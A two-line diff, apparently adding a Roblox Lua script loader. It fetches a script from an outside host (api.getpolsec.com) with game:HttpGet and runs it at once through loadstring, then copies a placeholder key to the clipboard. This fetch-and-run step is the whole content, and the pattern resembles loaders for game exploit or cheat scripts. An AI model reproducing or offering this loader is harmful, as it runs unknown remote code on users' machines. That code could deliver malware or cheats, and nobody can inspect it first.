@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://api.getpolsec.com/scripts/files/e43e39cc330f630fde1d1857be3f05f757184f90f2a8f6c1775d69f19e96b0d7.lua",true))()
+setclipboard("%KEY%")
